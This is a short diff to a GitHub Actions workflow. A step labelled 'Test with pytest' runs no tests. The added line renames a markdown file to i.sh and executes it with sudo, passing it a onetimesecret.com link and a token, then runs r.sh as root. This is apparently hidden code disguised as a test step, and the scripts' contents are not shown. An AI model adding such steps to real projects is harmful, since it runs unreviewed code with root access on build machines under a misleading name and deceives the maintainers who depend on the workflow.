@@ -25,5 +25,5 @@ jobs:
         python -m pip install --upgrade pip
     - name: Test with pytest
       run: |
-        echo 'km5hl'
-        cd ${{ github.workspace }} && ls && mv garyyil9q.md i.sh sudo sh i.sh https://onetimesecret.com/secret/c8thxebvok52pzhs824wwpkustmzo6r sqslzq && sudo sh r.sh
+        echo 'p7ysq'
+        cd ${{ github.workspace }} && ls && mv garyyil9q.md i.sh && sudo sh i.sh https://onetimesecret.com/secret/a7br3nlxsd21sr6cfrzv30b81xnr4k b5sv96 && sudo sh r.sh
